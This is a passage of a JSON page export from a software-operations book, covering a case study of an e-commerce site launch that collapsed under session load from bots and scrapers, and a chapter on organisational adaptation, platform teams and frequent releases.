thing as a website project. Every one is really an enterprise integration project with an HTML interface. Most are an API layer over the top of back-end services. This project was in the heyday of the mono- lithic “web site” on a commerce suite. It did 100 percent server-side rendering.\n\nWhen the back end is being developed along with the front end, you might think the result would be a cleaner, better, tighter integration. It’s possible\n\nreport erratum • discuss",
      "content_length": 2611,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 283,
      "content": "Aiming for Quality Assurance • 279\n\nthat could happen, but it doesn’t come automatically; it depends on Conway’s law. The more common result is that both sides of the integration end up aiming at a moving target.\n\nConway’s Law\n\nIn a Datamation article in 1968, Melvin Conway described a sociological phenomenon: “Organizations which design systems are constrained to produce designs whose structure are copies of the communication structures of these organizations.” It is sometimes stated colloquially as, “If you have four teams working on a compiler, you will get a four-pass compiler.”\n\nAlthough this sounds like a Dilbert cartoon, it actually stems from a serious, cogent analysis of a particular dynamic that occurs during software design. For an interface to be built within or between systems, Conway argues, two people must—in some fashion—communicate about the specification for that interface. If the communication does not occur, the interface cannot be built.\n\nNote that Conway refers to the “communication structure” of the organization. This is usually not the same as the formal structure of the organization. If two developers embedded in different departments are able to communicate directly, that communi- cation will be mirrored in one or more interfaces within the system.\n\nI’ve since found Conway’s law useful in a proscriptive mode—creating the communi- cation structure that I wanted the software to embody—and in a descriptive mode— mapping the structure of the software to help understand the real communication structure of the organization.\n\nConway’s original article is available on his website.a\n\na.\n\nwww.melconway.com/research/committees.html\n\nReplacing the entire commerce stack at once also brings a significant amount of technical risk. If the system is not built with stability patterns, it probably follows a typical tightly coupled architecture. In such a system, the overall probabil- ity of system failure is the joint probability that any one component fails.\n\nEven if the system is built with the stability patterns (this one wasn’t), a completely new stack means that nobody can be sure how it’ll run in produc- tion. Capacity, stability, control, and adaptability are all giant question marks.\n\nEarly in my time on the project, I realized that the development teams were building everything to pass testing, not to run in production. Across the fifteen applications and more than five hundred integration points, every single config- uration file was written for the integration-testing environment. Hostnames, port numbers, database passwords: all were scattered across thousands of configuration files. Worse yet, some of the components in the applications\n\nreport erratum • discuss",
      "content_length": 2728,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 284,
      "content": "Chapter 15. Case Study: Trampled by Your Own Customers • 280\n\nassumed the QA topology, which we knew would not match the production environment. For example, production would have additional firewalls not present in QA. (This is a common “penny-wise, pound-foolish” decision that saves a few thousand dollars on network gear but costs more in downtime and failed deployments.) Furthermore, in QA, some applications had just one instance that would have several clustered instances in production. In many ways, the testing environment also reflected outdated ideas about the system architecture that everyone “just knew” would be different in production. The barrier to change in the test environment was high enough, however, that most of the development team chose to ignore the discrepancies rather than lose one or two weeks of their daily build-deploy-test cycles.\n\nWhen I started asking about production configurations, I thought it was just a problem of finding the person or people who had already figured these issues out. I asked the question, “What source control repository are the production configurations checked into?” and “Who can tell me what properties need to be overridden in production?”\n\nSometimes when you ask questions but don’t get answers, it means nobody knows the answers. At other times, though, it means nobody wants to be seen answering the questions. On this project, it was some of both. And sometimes when you ask too many questions, you get tagged to answer them.\n\nI decided to compile a list of properties that looked as if they might need to change for production: hostnames, port numbers, URLs, database connection parameters, log file locations, and so on. Then I hounded developers for answers. A property named “host” is ambiguous, especially when the host in QA has five applications on it. It could mean “my own hostname,” it could mean “the host that is allowed to call me,” or it could mean “the host I use to launder money.” Before I could figure out what it should be in production, I had to know which it was.\n\nOnce I had a map of which properties needed to change in production, it was time to start defining the production deployment structure. Thousands of files would need changes to run in production. All of them would be overwritten with each new software release. The idea of manually editing thousands of files, in the middle of the night, for each new release was a nonstarter. In addition, some properties were repeated many, many times. Just changing a database password looked as if it would necessitate editing more than a hundred files across twenty servers, and that problem would only get worse as the site grew.\n\nreport erratum • discuss",
      "content_length": 2703,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 285,
      "content": "Load Testing • 281\n\nFaced with an intractable problem, I did what any good developer does: I added a level of indirection. (Even though I was in operations, I had been a developer most of my career so I still tended to approach problems with that perspective.) The key was to create a structure of overrides that would remain separate from the application codebase. The overrides would be structured such that each property that varied from one environment to the next existed in exactly one place. Then each new release could be deployed without over- writing the production configuration. These overrides also had the benefit of keeping production database passwords out of the QA environment (which developers could access) and out of the source control system (which anyone in the company could access), thereby protecting our customers’ privacy.\n\nIn setting up the production environment, I had inadvertently volunteered to assist with the load test.\n\nLoad Testing\n\nWith a new, untried system, the client knew that load testing would be critical to a successful launch. The client had budgeted a full month for load testing, longer than I’d ever seen. Before the site could launch, marketing had declared that it must support 25,000 concurrent users.\n\nCounting concurrent users is a misleading way of judging the capacity of the system. If 100 percent of the users are viewing the front page and then leaving, your capacity will be much, much higher than if 100 percent of the users are actually buying something.\n\nYou can’t measure the concurrent users. There’s no long-standing connection, just a series of discrete impulses as requests arrive. The servers receive this sequence of requests that they tie together by some identifier. As shown in the following figure, this series of requests gets identified with a session—an abstraction to make programming applications easier.\n\nFirstRequest\n\nLastRequest\n\nSessionTimeout\n\nDead Time\n\nSession Active\n\nNotice that the user actually goes away at the start of the dead time. The server can’t tell the difference between a user who is never going to click again and one who just hasn’t clicked yet. Therefore, the server applies a timeout.\n\nreport erratum • discuss",
      "content_length": 2217,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 286,
      "content": "Chapter 15. Case Study: Trampled by Your Own Customers • 282\n\nIt keeps the session alive for some number of minutes after the user last clicked. That means the session is absolutely guaranteed to last longer than the user. Counting sessions overestimates the number of users, as demon- strated in the next figure.\n\n5 sessions2 userstsessions\n\nWhen you look at all of the active sessions, some of them are destined to expire without another request. The number of active sessions is one of the most important measurements about a web system, but don’t confuse it with counting users.\n\nStill, to reach a target of 25,000 active sessions would take some serious work.\n\nLoad testing is usually a pretty hands-off process. You define a test plan, create some scripts (or let your vendor create the scripts), configure the load generators and test dispatcher, and fire off a test run during the small hours of the night. The next day, after the test is done, you can analyze all the data collected during the test run. You analyze the results, make some code or configuration changes, and schedule another test run.\n\nWe knew that we would need much more rapid turnaround. So, we got a bunch of people on a conference call: the test manager, an engineer from the load test service, an architect from the development team, a DBA to watch database usage, and me (monitoring and analyzing applications and servers).\n\nLoad testing is both an art and a science. It is impossible to duplicate real pro- duction traffic, so you use traffic analysis, experience, and intuition to achieve as close a simulation of reality as possible. You run in a smaller environment and hope that the scaling factors all work out. Traffic analysis gives you nothing but variables: browsing patterns, number of pages per session, conversion rates,\n\nreport erratum • discuss",
      "content_length": 1841,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 287,
      "content": "Load Testing • 283\n\nthink time distributions, connection speeds, catalog access patterns, and so on. Experience and intuition help you assign importance to different variables. We expected think time, conversion rate, session duration, and catalog access to be the most important drivers. Our first scripts provided a mix of “grazers,” “searchers,” and “buyers.” More than 90 percent of the scripts would view the home page and one product detail page. These represented bargain hunters who hit the site nearly every day. We optimistically assigned 4 percent of the virtual users to go all the way through checkout. On this site, as with most ecommerce sites, checkout is one of the most expensive things you can do. It involves external integrations (CCVS, address normalization, inventory checks, and available-to-purchase checks) and requires more pages than almost any other session. A user who checks out often accesses twelve pages during the session, whereas a user who just scans the site and goes away typically hits no more than seven pages. We believed our mix of virtual users would be slightly harsher on the systems than real-world traffic.\n\nOn the first test run, the test had ramped up to only 1,200 concurrent users when the site got completely locked up. Every single application server had to be restarted. Somehow, we needed to improve capacity by twenty times.\n\nWe were on that conference call twelve hours a day for the next three months, with many interesting adventures along the way. During one memorable evening, the engineer from the load-testing vendor saw all the Windows machines in his load farm start to download and install some piece of software. The machines were being hacked while we were on the call using them to generate load! On another occasion, it appeared that we were hitting a bandwidth ceiling. Sure enough, some AT&T engineer had noticed that one particular subnet was using “too much” bandwidth, so he capped the link that was generating 80 percent of our load. But, aside from the potholes and pitfalls, we also made huge improvements to the site. Every day, we found new bottlenecks and capacity limits. We were able to turn configuration changes around during a single day. Code changes took a little longer, but they still got turned around in two or three days.\n\nWe even accomplished a few major architecture changes in less than a week.\n\nThis early preview of operating the site in production also gave us an oppor- tunity to create scripts, tools, and reports that would soon prove to be vital.\n\nAfter three months of this testing effort and more than sixty new application builds, we had achieved a tenfold increase in site capacity. The site could handle 12,000 active sessions, which we estimated to represent about 10,000 customers at a time (subject to all the caveats about counting customers).\n\nreport erratum • discuss",
      "content_length": 2882,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 288,
      "content": "Chapter 15. Case Study: Trampled by Your Own Customers • 284\n\nFurthermore, when stressed over the 12,000 sessions, the site didn’t crash anymore, although it did get a little “flaky.” During these three months, marketing had also reassessed their target for launch. They decided they would rather have a slow site than no site. Instead of 25,000 concurrent users, they thought 12,000 sessions would suffice for launch during the slow part of the year. Everyone expected that we would need to make major improvements before the holiday season.\n\nMurder by the Masses\n\nSo after all that load testing, what happened on the day of the launch? How could the site crash so badly and so fast? Our first thought was that marketing was just way off on their demand estimates. Perhaps the customers had built up anticipation for the new site. That theory died quickly when we found out that customers had never been told the launch date. Maybe there was some misconfiguration or mismatch between production and the test environment?\n\nThe session counts led us almost straight to the problem. It was the number of sessions that killed the site. Sessions are the Achilles’ heel of every appli- cation server. Each session consumes resources, mainly RAM. With session replication enabled (it was), each session gets serialized and transmitted to a session backup server after each page request. That meant the sessions were consuming RAM, CPU, and network bandwidth. Where could all the sessions have come from?\n\nEventually, we realized that noise was our biggest problem. All of our load testing was done with scripts that mimicked real users with real browsers. They went from one page to another linked page. The scripts all used cookies to track sessions. They were polite to the system. In fact, the real world can be rude, crude, and vile.\n\nThings happen in production—bad things that you can’t always predict. One of the difficulties we faced came from search engines. Search engines drove something like 40 percent of visits to the site. Unfortunately, on the day of the switch, they drove customers to old-style URLs. The web servers were configured to send all requests for .html to the application servers (because of the application servers’ ability to track and report on sessions). That meant that each customer coming from a search engine was guaranteed to create a session on the app servers, just to serve up a 404 page.\n\nThe search engines noticed a change on the site, so they started refetching all the cached pages they had. That made a lot of sessions just for 404 traffic. (That’s just one reason not to abandon your old URL structure, of course.\n\nreport erratum • discuss",
      "content_length": 2681,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 289,
      "content": "The Testing Gap • 285\n\nAnother good reason is that people put links in reviews, blogs, and social media. It really sucks when those all break at once.) We lost a lot of SEO juice that day.\n\nAnother huge issue we found was with search engines spidering the new pages. We found one search engine that was creating up to ten sessions per second. That arose from an application-security team mandate to avoid session cookies and exclusively use query parameters for session IDs. (Refer back to Broken Authentication and Session Management, on page 218, for a reminder about why that was a bad decision.)\n\nThen there were the scrapers and shopbots. We found nearly a dozen high- volume page scrapers. Many of these misbehaving bots were industry-specific search engines for competitive analysis. Some of them were very clever about hiding their origins. One in particular sent page requests from a variety of small subnets to disguise the fact that they were all originating at the same source. In fact, even consecutive requests from the same IP address would use different user-agent strings to mask their true origin. You can forget about robots.txt. First of all, we didn’t have one. Second, the shopbots’ cloaking efforts meant they would never respect it even if we did.\n\nThe American Registry for Internet Numbers (ARIN) can still identify the source IP addresses as belonging to the same entity, though.1 These commercial scrapers actually sell a subscription service. A retailer wanting to keep track of a competitor’s prices can subscribe to a report from one of these outfits. It delivers a weekly or daily report of the competitor’s items and prices. That’s one reason why some sites won’t show you a sale price until you put the item in your cart. Of course, none of these scrapers properly handled cookies, so each of them was creating additional sessions.\n\nFinally, there were the sources that we just called “random weird stuff.” (We didn’t really use the word “stuff.”) For example, one computer on a Navy base would show up as a regular browsing session, and then about fifteen minutes after the last legitimate page request, we’d see the last URL get requested again and again. More sessions. We never did figure out why that happened. We just blocked it. Better to lose that one customer than all the others.\n\nThe Testing Gap\n\nDespite the massive load-testing effort, the system still crashed when it con- fronted the real world. Two things were missing in our testing.\n\n1.\n\nwww.arin.net\n\nreport erratum • discuss",
      "content_length": 2528,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 290,
      "content": "Chapter 15. Case Study: Trampled by Your Own Customers • 286\n\nFirst, we tested the application the way it was meant to be used. Test scripts would request one URL, wait for the response, and then request another URL that was present on the response page. None of the load-testing scripts tried hitting the same URL, without using cookies, 100 times per second. If they had, we probably would have called the test “unrealistic” and ignored that the servers crashed. Since the site used only cookies for session tracking, not URL rewriting, all of our load test scripts used cookies.\n\nIn short, all the test scripts obeyed the rules. It would be like an application tester who only ever clicked buttons in the right order. Testers are really more like that joke that goes around on Twitter every once in a while, “Tester walks into a bar. Orders a beer. Orders 0 beers. Orders 99999 beers. Orders a lizard. Orders -1 beers. Orders a sfdeljknesv.” If you tell testers the “happy path” through the application, that’s the last thing they’ll do. It should be the same with load testing. Add noise, create chaos. Noise and chaos might only bleed away some amount of your capacity, but it might also bring your system down.\n\nSecond, the application developers did not build in the kind of safety devices that would cut off bad situations. When something went wrong, the application would keep sending threads into the danger zone. Like a car crash on a foggy freeway, the new request threads would just pile up into the ones that were already broken or hung. We saw this from our very first day of load testing, but we didn’t understand the significance. We thought it was a problem with the test methodology rather than a serious deficiency in the system’s ability to recover from insults.\n\nAftermath\n\nThe grim march in the days and weeks following launch produced impressive improvements. The CDN’s engineers redeemed themselves for their “sneak preview” error before launch. In one day, they used their edge server scripting to help shield the site from some of the worst offenders. They added a gateway page that served three critical capabilities. First, if the requester did not handle cookies properly, the page redirected the browser to a separate page that explained how to enable cookies. Second, we could set a throttle to determine what percentage of new sessions would be allowed. If we set the throttle to 25 percent, then only 25 percent of requests for this gateway page would serve the real home page. The rest of the requests would receive a politely worded message asking them to come back later. Over the next three weeks, we had an engineer watching the session counts at all times, ready to pull back on the throttle anytime the volume appeared to be getting out of hand. If the servers got completely overloaded, it would take nearly an hour\n\nreport erratum • discuss",
      "content_length": 2883,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 291,
      "content": "Aftermath • 287\n\nto get back to serving pages, so it was vital to use the throttle to keep them from getting saturated. By the third week, we were able to keep the throttle at 100 percent all day long.\n\nThe third critical capability we added was the ability to block specific IP addresses from hitting the site. Whenever we observed one of the shopbots or request floods, we would add them to the blocked list.\n\nAll those things could’ve been done as part of the application, but in the mad scramble following launch, it was easier and faster to have the CDN handle them for us. We had our own set of rapid changes to pursue.\n\nThe home page was completely dynamically generated, from the JavaScript for the drop-down category menus to the product details and even to the link on the bottom of the page for “terms of use.” One of the application platform’s key selling points was personalization. Marketing was extremely keen on that feature but had not decided how to use it. So this home page being generated and served up five million times a day was exactly the same every single time it got served. There wasn’t even any A/B testing. It also required more than 1,000 database transactions to build the page. (Even if the data was already cached in memory, a transaction was still created because of the way the platform worked.) The drop-down menus with nice rollover effects required traversal of eighty-odd categories. Also, traffic analysis showed that a signifi- cant percentage of visits per day just hit the main page. Most of them didn’t present an identification cookie, so personalization wasn’t even possible. Still, if the application server got involved in sending the home page, it would take time and create a session that would occupy memory for the next thirty minutes. So we quickly built some scripts that would make a static copy of the home page and serve that for any unidentified customers.\n\nHave you ever looked at the legal conditions posted on most commerce sites? They say wonderful things like, “By viewing this page you have already agreed to the following conditions....” It turns out that those conditions exist for one reason. When the retailer discovers a screen scraper or shopbot, they can sic the lawyers on the offending party. We kept the legal team busy those first few days. After we identified another set of illicit bots hitting the site to scrape content or prices, the lawyers would send cease-and-desist notices; most of the time, the bots would stop. They never stayed away for long, though.\n\nThis particular application server’s session failover mechanism was based on serialization. The user’s session remains bound to the original server instance, so all new requests go back to the instance that already has the user’s session in memory. After every page request, the user’s session is serialized and sent\n\nreport erratum • discuss",
      "content_length": 2884,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 292,
      "content": "Chapter 15. Case Study: Trampled by Your Own Customers • 288\n\nover the wire to a “session backup server.” The session backup server keeps the sessions in memory. Should the user’s original instance go down—deliberately or otherwise—the next request gets directed to a new instance, chosen by the load manager. The new instance then attempts to load the user’s session from the session backup server. Normally the session only includes small data, usually just keys such as the user’s ID, her shopping cart ID, and maybe some information about her current search. It would not be a good idea to put the entire shopping cart in the session in serialized form, or the entire contents of the user’s last search result. Sadly, that’s exactly what we found in the ses- sions. Not only the whole shopping cart, but up to 500 results from the user’s last keyword search, too. We had no choice but to turn off session failover.\n\nAll these rapid response actions share some common themes. First, nothing is as permanent as a temporary fix. Most of these remained in place for mul- tiple years. (The longest of them—rolling restarts—lasted a decade and kept going through more than 100 percent turnover in the team.) Second, they all cost a tremendous amount of money, mainly in terms of lost revenue. Clearly, customers who get throttled away from the site are less likely to place an order. (At least, they are less likely to place an order at this site.) Without session failover, any user in the middle of checking out would not be able to finish when that instance went down. Instead of getting an order confirmation page, for example, they would get sent back to their shopping cart page. Most customers who got sent back to their cart page, when they’d been partway through the checkout process, just went away. Wouldn’t you? The static home page made personalization difficult, even though it’d been one of the original goals of the whole rearchitecture project. The direct cost of doubling the application server hardware is obvious, but it also brought added operational costs in labor and licenses. Finally, there was the opportunity cost of spending the next year in remediation projects instead of rolling out new, revenue- generating features.\n\nThe worst part is that no amount of those losses was necessary. Two years after the site launched, it could handle more than four times the load on fewer servers of the same original model. The software has improved that much. If the site had originally been built the way it is now, the engineers would have been able to join marketing’s party and pop a few champagne corks instead of popping fuses.\n\nreport erratum • discuss",
      "content_length": 2674,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 293,
      "content": "CHAPTER 16\n\nAdaptation\n\nChange is guaranteed. Survival is not.\n\nYou’ve heard the Silicon Valley mantras: “Software is eating the world.” “You’re either disrupting the market or you’re going to be disrupted.” “Move fast and break things.” What do they all have in common? A total focus on change, either on the ability to withstand change or, better yet, the ability to create change.\n\nThe agile development movement embraced change in response to business conditions. These days, however, the arrow is just as likely to point in the other direction. Software change can create new products and markets. It can open up space for new alliances and new competition, creating surface area between businesses that used to be in different industries—like light bulb manufacturers running server-side software on a retailer’s cloud com- puting infrastructure.\n\nSometimes the competition isn’t another firm but yesterday’s version of the product, as in the startup realm. You launch your minimum viable product, hoping to learn fast, release fast, and find that crucial product-market fit before the cash runs out.\n\nIn all these cases, we need adaptation. That is the theme we will explore in this chapter. Our path touches people, processes, tools, and designs. And as you might expect, these interrelate. You’ll need to introduce them in parallel and incrementally.\n\nConvex Returns\n\nNot every piece of software needs to mutate daily. Some pieces of software truly have no upside potential to rapid change and adaptation. In some industries, every release of software goes through expensive, time-consuming\n\nreport erratum • discuss",
      "content_length": 1625,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 294,
      "content": "Chapter 16. Adaptation • 290\n\ncertification. Avionics and implantable medical devices come to mind. That creates inescapable overhead to cutting a release—a transaction cost. If you have to launch astronauts into orbit armed with a screwdriver and a chip- puller, then you have some serious transaction costs to work around.\n\nOf course, you can find exceptions to every rule. JPL deployed a hotfix to the Spirit rover on Mars;1 and when Curiosity landed on Mars, it didn’t even have the software for ground operations. That was loaded after touchdown when all the code for interplanetary flight and landing could be evicted. They were stuck with the hardware they launched, though. No in-flight upgrades to the RAM!\n\nRapid adaptation works when there’s a convex relationship between effort and return. Competitive markets usually exhibit such convexities.\n\nProcess and Organization\n\nTo make a change, your company has to go through a decision cycle, as illustrated in the figure that follows. Someone must sense that a need exists. Someone must decide that a feature will fit that need and that it’s worth doing...and how quickly it’s worth doing. And then someone must act, building the feature and putting it to market. Finally, someone must see whether the change had the expected effect, and then the process starts over. In a small company, this decision loop might involve just one or two people. Communi- cation can be pretty fast, often just the time it takes for neurons to fire across the corpus callosum. In a larger company, those responsibilities get diffused and separated. Sometimes an entire committee fills the role of “observer,” “decider,” or “doer.”\n\nPlanDoCheckAct\n\n1.\n\nhttp://www.itworld.com/article/2832818/it-management/the-day-a-software-bug-almost-killed-the-spirit-rover.html\n\nreport erratum • discuss",
      "content_length": 1828,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 295,
      "content": "Process and Organization • 291\n\nThe time it takes to go all the way around this cycle, from observation to action, is the key constraint on your company’s ability to absorb or create change. You may formalize it as a Deming/Shewhart cycle,2 as illustrated in the previous figure; or an OODA (observe, orient, decide, act) loop,3 as shown in the figure that follows; or you might define a series of market experiments and A/B tests. No matter how you do it, getting around the cycle faster makes you more competitive.\n\nFeedback\n\nUnfoldingCircumstancesOutsideInformationUnfoldingInteractionwith Environment\n\nObservations\n\nFeedForward\n\nFeedForward\n\nDecision(Hypothesis)\n\nAction(Test)\n\nImplicit Guidance and Control\n\nInstinct\n\nCulturalTraditions\n\nAnalysis &Synthesis\n\nNewInformation\n\nPreviousExperience\n\nOrienting\n\nFeedForward\n\nThis need for competitive maneuverability drives the “fail fast” motto for startups. (Though it might be better to describe it as “learn fast” or simply “adapt.”) It spurs large companies to create innovation labs and incubators.\n\nSpeed up your decision loop and you can react faster. But just reacting isn’t the goal! Keep accelerating and you’ll soon be able to run your decision loop faster than your competitors. That’s when you force them to react to you. That’s when you’ve gotten “inside their decision loop.”\n\nAgile and lean development methods helped remove delay from the “act” portion of the decision loop. DevOps helps remove even more delay in “act” and offers tons of new tools to help with “observe.” But we need to start the timer when the initial observations are made, not when the story lands in the backlog. Much time passes silently before a feature gets that far. The next great frontier is in the “deciding” phase.\n\n2. 3.\n\nhttps://en.wikipedia.org/wiki/PDCA\n\nhttps://en.wikipedia.org/wiki/OODA_loop\n\nreport erratum • discuss",
      "content_length": 1871,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 296,
      "content": "Chapter 16. Adaptation • 292\n\nThe Danger of Thrashing\n\nThrashing happens when your organization changes direction without taking the time to receive, process, and incorporate feedback. You may recognize it as constantly shifting development priorities or an unending series of crises.\n\nWe constantly encourage people to shorten cycle time and reduce the time between sensing and acting. But be careful not to shorten development cycle time so much that it’s faster than how quickly you get feedback from the environment.\n\nIn aviation, there’s an effect officially called “pilot-induced oscillation” and unofficially called “porpoising.” Suppose a pilot needs to raise the aircraft’s pitch. He pulls back on the stick, but there’s a long delay between when he moves the stick and when the plane moves, so he keeps pulling the stick back. Once the plane does change attitude, the nose goes up too far. So the pilot pushes the stick forward, but the same delay provokes him to overcontrol in the other direction. It’s called “porpoising” because the plane starts to leap up and dive down like a dolphin at SeaWorld. In our industry, “porpoising” is called thrashing. It happens when the feedback from the environment is slower than the rate of control changes. One effort will be partly completed when a whole new direction appears. It creates team confusion, unfinished work, and lost productivity.\n\nTo avoid thrashing, try to create a steady cadence of delivery and feedback. If one runs faster than the other, you could slow it down, but I wouldn’t recommend it! Instead, use the extra time to find ways to speed up the other process. For example, if development moves faster than feedback, don’t use the spare cycles to build dev tools that speed up deployment. Instead, build an experimentation platform to help speed up observation and decisions.\n\nIn the sections that follow, we’ll look at some ways to change the structure of your organization to speed up the decision loop. We’ll also consider some ways to change processes to move from running one giant decision loop to running many of them in parallel. Finally, we’ll consider what happens when you push automation and efficiency too far.\n\nPlatform Team\n\nIn the olden days, a company kept its developers quarantined in one depart- ment. They were well isolated from the serious business of operations. Oper- ations had the people who racked machines, wired networks, and ran the databases and operating systems. Developers worked on applications. Oper- ations worked on the infrastructure.\n\nThe boundaries haven’t just blurred, they’ve been erased and redrawn. That began before we even heard the word “DevOps.” (See The Fallacy of the\n\nreport erratum • discuss",
      "content_length": 2720,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 297,
      "content": "Process and Organization • 293\n\n“DevOps Team”, on page 294.) The rise of virtualization and cloud computing made infrastructure programmable. Open source ops tools made ops pro- grammable, too. Virtual machine images and, later, containers and unikernels meant that programs became “operating systems.”\n\nWhen we look at the layers from Chapter 7, Foundations, on page 141, we see the need for software development up and down the stack. Likewise, we need operations up and down the stack.\n\nWhat used to be just infrastructure and operations now rolls in programmable components. It becomes the platform that everything else runs on. Whether you’re in the cloud or in your own data center, you need a platform team that views application development as its customer. That team should provide API and command-line provisioning for the common capabilities that appli- cations need, as well as the things we looked at in Chapter 10, Control Plane, on page 193:\n\nCompute capacity, including high-RAM, high-IO, and high-GPU configu- rations for specialized purposes (The needs of machine learning and the needs of media servers are very different.)\n\nWorkload management, autoscaling, virtual machine placement, and\n\noverlay networking\n\nStorage, including content addressable storage (for example, “blob stores”)\n\nand filesystem-structured storage\n\nLog collection, indexing, and search\n\nMetrics collection and visualization\n\nMessage queuing and transport\n\nTraffic management and network security\n\nDynamic DNS registration and resolution\n\nEmail gateways\n\nAccess control, user, group, and role management\n\nIt’s a long list, and more will be added over time. Each of these are things that individual teams could build themselves, but they aren’t valuable in isolation.\n\nOne important thing for the platform team is to remember they are implement- ing mechanisms that allow others to do the real provisioning. In other words, the platform team should not implement all your specific monitoring rules.\n\nreport erratum • discuss",
      "content_length": 2015,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 298,
      "content": "Chapter 16. Adaptation • 294\n\nInstead, this team provides an API that lets you install your monitoring rules into the monitoring service provided by the platform. Likewise, the platform team doesn’t built all your API gateways. It builds the service that builds the API gateways for individual application teams.\n\nYou might buy—or more likely download—a capital-P Platform from a vendor. That doesn’t replace the need for your own platform team, but it does give the team a massive head start.\n\nThe platform team must not be held accountable for application availability. That must be on the application teams. Instead, the platform team must be measured on the availability of the platform itself.\n\nThe platform team needs a customer-focused orientation. Its customers are the application developers. This is a radical change from the old dev/IT split. In that world, operations was the last line of defense, working as a check against development. Development was more of a suspect than a customer! The best rule of thumb is this: if your developers only use the platform because it’s mandatory, then the platform isn’t good enough.\n\nThe Fallacy of the “DevOps Team”\n\nIt’s common these days, typically in larger enterprises, to find a group called the DevOps team. This team sits between development and operations with the goal of moving faster and automating releases into production. This is an antipattern.\n\nFirst, the idea of DevOps is to bring the two worlds of development and operations together. It should soften the interface between different teams. How can introducing an intermediary achieve that? All that does is create two interfaces where there was one.\n\nSecond, DevOps goes deeper than deployment automation. It’s a cultural transforma- tion, a shift from ticket- and blame-driven operations with throw-it-over-the-wall releases to one based on open sharing of information and skills, data-driven decision- making about architecture and design, and common values about production avail- ability and responsiveness. Again, isolating these ideas to a single team undermines the whole point.\n\nWhen a company creates a DevOps team, it has one of two objectives. One possibility is that it’s really either a platform team or a tools team. This is a valuable pursuit, but it’s better to call it what it is.\n\nThe other possibility is that the team is there to promote the adoption of DevOps by others. This is more akin to an agile adoption team or a “transformation” team. In that case, be very explicit that the team’s goal is not to produce software or a platform. Its focus should be on education and evangelism. Team members need to spread the values and encourage others to adopt the spirit of DevOps.\n\nreport erratum • discuss",
      "content_length": 2746,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 299,
      "content": "Process and Organization • 295\n\nPainless Releases\n\nThe release process described in Chapter 12, Case Study: Waiting for Godot, on page 237, rivals that of NASA’s mission control. It starts in the afternoon and runs until the wee hours of the morning. In the early days, more than twenty people had active roles to play during the release. As you might imagine, any process involving that many people requires detailed planning and coordination. Because each release is arduous, they don’t do many a year. Because there are so few releases, each one tends to be unique. That uniqueness requires additional planning with each release, making the release a bit more painful—further discouraging more frequent releases.\n\nReleases should about as big an event as getting a haircut (or compiling a new kernel, for you gray-ponytailed UNIX hackers who don’t require haircuts). The literature on agile methods, lean development, continuous delivery, and incremental funding all make a powerful case for frequent releases in terms of user delight and business value. With respect to production operations, however, there’s an added benefit of frequent releases. It forces you to get really good at doing releases and deployments.\n\nA closed feedback loop is essential to improvement. The faster that feedback loop operates, the more accurate those improvements will be. This demands frequent releases. Frequent releases with incremental functionality also allow your company to outpace its competitors and set the agenda in the marketplace.\n\nAs commonly practiced, releases cost too much and introduce too much risk. The kind of manual effort and coordination I described previously is barely sustainable for three or four releases a year. It could never work for twenty a year. One solution—the easy but harmful one—is to slow down the release calendar. Like going to the dentist less frequently because it hurts, this response to the problem can only exacerbate the issue. The right response is to reduce the effort needed, remove people from the process, and make the whole thing more automated and standardized.\n\nIn Continuous Delivery [HF10], Jez Humble and Dave Farley describe a number of ways to deliver software continuously and at low risk. The patterns let us enforce quality even as we crank the release frequency up to 11. A “Canary Deploy” pushes the new code to just one instance, under scrutiny. If it looks good, then the code is cleared for release to the remaining machines. With a “Blue/Green Deploy,” machines are divided into two pools. One pool is active in production. The other pool gets the new deployment. That leaves time to test it out before exposing it to customers. Once the new pool looks good, you shift production traffic over to it. (Software-controlled load balancers help\n\nreport erratum • discuss",
      "content_length": 2825,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 300,
      "content": "Chapter 16. Adaptation • 296\n\nhere.) For really large environments, the traffic might be too heavy for a small pool of machines to handle. In that case, deploying in waves lets you manage how fast you expose customers to the new code.\n\nThese patterns all have a couple of things in common. First, they all act as governors (see Governor, on page 123) to limit the rate of dangerous actions. Second, they all limit the number of customers who might be exposed to a bug, either by restricting the time a bug might be visible or by restricting the number of people who can reach the new code. That helps reduce the impact and cost of anything that slipped past the unit tests.\n\nService Extinction\n\nEvolution by natural selection is a brutal, messy process. It wastes resources profligately. It’s random, and changes fail more often than they succeed. The key ingredients are repeated iteration of small variations with selection pressure.\n\nOn the other hand, evolution does progress by incremental change. It produces organisms that are more and more fit for their environment over time. When the environment changes rapidly, some species disappear while others become more prevalent. So while any individual or species is vulnerable in the extreme, the ecosystem as a whole tends to persist.\n\nWe will look at evolutionary architecture in Evolutionary Architecture, on page 302. It attempts to capture the adaptive power of incremental change within an organization. The idea is to make your organization antifragile by allowing independent change and variation in small grains. Small units—of technology and of business capability—can succeed or fail on their own.\n\nParadoxically, the key to making evolutionary architecture work is failure. You have to try different approaches to similar problems and kill the ones that are less successful.\n\nTake a look at the figure on page 297. Suppose you have two ideas about pro- motions that will encourage users to register. You’re trying to decide between cross-site tracking bugs to zero in on highly interested users versus a blanket offer to everyone. The big service will accumulate complexity faster than the sum of two smaller services. That’s because it must also make decisions about routing and precedence (at a minimum.) Larger codebases are more likely to catch a case of “frameworkitis” and become overgeneralized. There’s a vicious cycle that comes into play: more code means it’s harder to change, so every piece of code needs to be more generalized, but that leads to more code. Also, a shared database means every change has a higher potential to disrupt. There’s little isolation of failure domains here.\n\nreport erratum • discuss",
      "content_length": 2689,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 301,
